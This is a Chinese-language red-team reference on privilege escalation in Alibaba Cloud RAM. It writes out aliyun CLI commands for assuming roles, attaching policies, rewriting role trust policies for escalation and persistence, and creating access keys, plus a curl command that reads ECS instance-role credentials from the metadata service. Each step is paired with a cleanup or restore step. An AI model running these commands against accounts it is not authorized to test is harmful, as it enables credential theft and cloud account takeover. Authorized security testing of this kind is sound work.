# Alibaba Cloud / 阿里云提权路径

## 1. RAM 权限模型

Alibaba RAM 核心与 AWS IAM 相似但 API/ARN/条件不同：

```text
RAM User / RAM Role
 → System/Custom Policy
 → Resource / Condition
 → Role Trust Policy
 → STS AssumeRole
```

不要只看 `AdministratorAccess`；重点找可组合权限。

## 2. AssumeRole

条件：

```text
调用方允许 sts:AssumeRole
+
目标 RAM Role Trust Policy 信任调用方
+
ExternalId / SourceIdentity 等 Condition 满足
```

```bash
aliyun sts AssumeRole \
  --RoleArn 'acs:ram::<ACCOUNT_ID>:role/<ROLE>' \
  --RoleSessionName redteam \
  --DurationSeconds 3600
```

有 ExternalId：

```bash
aliyun sts AssumeRole \
  --RoleArn 'acs:ram::<ACCOUNT_ID>:role/<ROLE>' \
  --RoleSessionName redteam \
  --ExternalId '<ID>' \
  --DurationSeconds 3600
```

## 3. AttachPolicyToUser / Role

高价值：

```text
ram:AttachPolicyToUser
ram:AttachPolicyToRole
```

先列原 policy：

```bash
aliyun ram ListPoliciesForUser --UserName <USER>
aliyun ram ListPoliciesForRole --RoleName <ROLE>
```

授权验证示例：

```bash
aliyun ram AttachPolicyToRole \
  --PolicyType Custom \
  --PolicyName <POLICY> \
  --RoleName <ROLE>
```

验证后使用对应 Detach API 清理。

## 4. Policy Version

若可创建/切换 Custom Policy 版本，可通过新 default version 改变所有绑定该 policy 的 principal 权限。

执行前保存当前 default version 和 PolicyDocument；结束恢复。

## 5. UpdateRole Trust

`ram:UpdateRole` 支持 `NewAssumeRolePolicyDocument`，因此对高价值 Role 的该权限既可用于提权，也可用于 persistence。

```bash
aliyun ram GetRole --RoleName <ROLE> > role-original.json
```

测试 trust JSON 后：

```bash
aliyun ram UpdateRole \
  --RoleName <ROLE> \
  --NewAssumeRolePolicyDocument "$(cat trust-test.json)"
```

验证：被新增 Principal 成功 `sts AssumeRole`。

清理：从 `role-original.json` 恢复原 AssumeRolePolicyDocument。

## 6. CreateAccessKey

条件：`ram:CreateAccessKey`。

```bash
aliyun ram CreateAccessKey --UserName <USER>
```

返回 AccessKeySecret 只在创建响应时可见；记录 key id，测试完删除。

## 7. ECS RAM Role / Metadata

如果已在 ECS：

```bash
curl -s http://100.100.100.200/latest/meta-data/ram/security-credentials/
```

获得 role 后按其 STS identity 重新做 RAM/资源权限分析。

## 8. Function Compute

如果可以修改 Function 代码/配置并且函数绑定高权 RAM Role，可形成 execution identity 路径。

先枚举函数 Role、trigger、version、env；保存原配置再做验证。

## 9. ACK boundary

如果云权限能够获取 ACK kubeconfig/token，只输出 `/k8s` 候选。K8s 内的 RBAC/Pod/escape 不写在本文件。

## 10. Source

- UpdateRole: https://www.alibabacloud.com/help/en/ram/developer-reference/api-ram-2015-05-01-updaterole
- CreateAccessKey: https://www.alibabacloud.com/help/en/ram/developer-reference/api-ram-2015-05-01-createaccesskey
- AttachPolicyToRole: https://www.alibabacloud.com/help/en/ram/developer-reference/api-ram-2015-05-01-attachpolicytorole
